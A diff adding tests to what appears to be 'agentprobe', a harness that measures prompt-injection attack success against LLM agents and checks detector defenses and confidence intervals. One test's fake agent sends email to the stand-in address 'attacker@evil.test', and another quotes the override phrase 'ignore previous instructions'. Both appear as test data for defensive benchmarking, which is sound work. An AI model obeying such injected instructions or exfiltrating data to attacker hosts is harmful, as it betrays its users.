@@ -235,6 +235,44 @@ def test_openai_adapter_with_fake_client():
     assert run_case(agent, case).attack_succeeded
 
 
+def test_openai_adapter_tolerates_truncated_tool_json():
+    class Fn:
+        def __init__(self, name, arguments):
+            self.name = name
+            self.arguments = arguments
+
+    class Tc:
+        def __init__(self, name, arguments):
+            self.function = Fn(name, arguments)
+
+    class Msg:
+        def __init__(self, content, tool_calls):
+            self.content = content
+            self.tool_calls = tool_calls
+
+    class Choice:
+        def __init__(self, msg):
+            self.message = msg
+
+    class Resp:
+        def __init__(self, msg):
+            self.choices = [Choice(msg)]
+
+    class Completions:
+        def create(self, **kwargs):
+            return Resp(Msg("ok", [Tc("send_email", '{"to": "att')]))
+
+    class Fake:
+        def __init__(self) -> None:
+            self.chat = self
+            self.completions = Completions()
+
+    agent = OpenAIAdapter(model="fake", client=Fake())
+    case = next(c for c in load_cases() if c.id == "dpi-001")
+    result = run_case(agent, case)
+    assert not result.attack_succeeded
+
+
 def test_cli_list(capsys):
     from agentprobe.cli import main
 
@@ -434,6 +472,8 @@ def test_asr_by_delivery_and_placement():
     assert data["asr_by_placement"]["start"] == 0.0
     assert data["asr_by_placement"]["end"] == 1.0
     assert "delivery user_message" in r.to_html()
+    assert "asr_ci" in data and len(data["asr_ci"]) == 2
+    assert data["asr_by_category_ci"]["direct_injection"][0] <= 1.0
 
 
 def test_enhanced_and_converters_change_payload():
@@ -463,6 +503,25 @@ def test_benign_utility_strips_attack():
 def test_detector_blocks_obey_email():
     report = run(ObeyAgent(), case_ids={"dpi-001"}, defense=("detector",))
     assert report.asr() == 0
+
+
+def test_detector_block_is_not_success_without_prior_tools():
+    """If the only tool attempt is blocked, empty sandbox log must not fall back to traj."""
+    class OnlyEmail:
+        name = "onlyemail"
+
+        def run(self, user_message, tools, execute):
+            execute("send_email", {"to": "attacker@evil.test", "body": "x"})
+            return Trajectory(
+                tool_calls=(ToolCall("send_email", {"to": "attacker@evil.test"}),),
+                text="done",
+            )
+
+    case = next(c for c in load_cases() if c.id == "dpi-001")
+    blocked = run_case(OnlyEmail(), case, defense=("detector",))
+    assert not blocked.attack_succeeded
+    live = run_case(OnlyEmail(), case)
+    assert live.attack_succeeded
 
 
 def test_sandwich_wraps_message_and_tool_result():
@@ -510,3 +569,31 @@ def test_cli_rejects_bad_defense():
     from agentprobe.cli import main
 
     assert main(["run", "--agent", "refuse", "--defense", "nope", "--category", "benign"]) == 1
+
+
+def test_naive_system_changes_label(tmp_path):
+    from agentprobe.cli import main
+    from agentprobe.report import load_report
+
+    assert main(["run", "--agent", "refuse", "--system", "naive", "--category", "benign", "--out", str(tmp_path)]) == 0
+    assert load_report(tmp_path).agent.endswith("+naive")
+
+
+def test_wilson_interval():
+    from agentprobe.report import wilson
+
+    lo, hi = wilson(13, 30)
+    assert 0.26 < lo < 0.28
+    assert 0.60 < hi < 0.62
+    _, hi0 = wilson(0, 190)
+    assert hi0 < 0.03
+    assert wilson(0, 0) == (0.0, 1.0)
+
+
+def test_quiet_cases_are_not_loud_templates():
+    quiet = [c for c in load_cases() if c.id.startswith("q")]
+    assert len(quiet) >= 48
+    blob = " ".join(c.payload.lower() for c in quiet)
+    assert "ignore previous instructions" not in blob
+    assert "attacker@evil.test" not in blob
+    assert all(c.inspired_by == "original" for c in quiet)
